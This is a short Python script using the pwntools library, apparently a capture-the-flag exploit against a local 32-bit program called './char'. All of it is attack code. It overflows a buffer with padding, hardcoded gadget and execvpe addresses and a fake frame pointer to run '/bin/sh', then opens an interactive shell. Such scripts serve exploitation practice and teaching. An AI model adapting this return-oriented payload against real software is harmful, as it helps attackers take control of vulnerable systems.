from pwn import *

context.log_level='debug'

s=process('./char')

s.recvuntil('GO : )')

offset = 0x5555e000
execvpe = 0xb8f34

'''
0x55616e97    mov    ecx, dword ptr [ebp + 0x10]
0x55616e9a    mov    esi, dword ptr [ebp - 0x20]
0x55616e9d    mov    dword ptr [esp], eax
0x55616ea0    mov    dword ptr [esp + 8], ecx
0x55616ea4    mov    dword ptr [esp + 4], esi
'''
fake_ebp = 0x55616760
ret = 0x55563844
addeax = 0xc7352

payload = 'A'*32
payload += p32(offset+addeax)
payload += '1234'*3 #ebx, esi, edi
payload += p32(fake_ebp)#ebp
payload += p32(offset+execvpe)
payload += 'B' * (0x108-len(payload))
payload += '/bin/sh'

raw_input()
s.sendline(payload)

s.interactive()


